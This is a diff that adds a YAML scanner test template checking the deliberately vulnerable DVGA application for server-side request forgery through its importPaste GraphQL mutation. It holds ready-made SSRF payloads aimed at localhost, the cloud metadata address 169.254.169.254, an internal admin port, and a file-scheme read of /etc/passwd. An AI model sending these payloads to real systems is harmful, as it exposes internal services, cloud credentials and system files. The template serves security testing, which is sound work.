@@ -1,0 +1,83 @@
+id: api7-ssrf-dvga
+info:
+  name: "DVGA - Server-Side Request Forgery via importPaste"
+  category: "API7:2023"
+  severity: "HIGH"
+  author: "hadrian"
+  description: "Tests for SSRF vulnerabilities in DVGA's importPaste mutation. The mutation accepts host, path, port, and scheme parameters without proper validation, allowing attackers to make requests to internal services, cloud metadata endpoints, or arbitrary URLs."
+  tags: ["graphql", "dvga", "ssrf", "importpaste"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: false
+
+role_selector:
+  attacker_permission_level: "all"
+  victim_permission_level: "all"
+
+graphql:
+  - query: |
+      mutation SSRFLocalhost {
+        importPaste(host: "localhost", path: "/", port: 80, scheme: "http") {
+          result
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["data", "importPaste"]
+        part: body
+
+  - query: |
+      mutation SSRFMetadata {
+        importPaste(host: "169.254.169.254", path: "/latest/meta-data/", port: 80, scheme: "http") {
+          result
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["data", "importPaste", "result"]
+        part: body
+
+  - query: |
+      mutation SSRFFileScheme {
+        importPaste(host: "", path: "/etc/passwd", port: 0, scheme: "file") {
+          result
+        }
+      }
+    matchers:
+      - type: status
+        status: [200, 400, 500]
+      - type: word
+        words: ["data", "errors"]
+        part: body
+        condition: or
+
+  - query: |
+      mutation SSRFInternalService {
+        importPaste(host: "127.0.0.1", path: "/admin", port: 5000, scheme: "http") {
+          result
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["importPaste"]
+        part: body
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.importPaste"
+      exists: true
+    - type: body_field
+      body_field: "errors"
+      exists: false
+  vulnerability_pattern: "dvga_ssrf_importpaste"
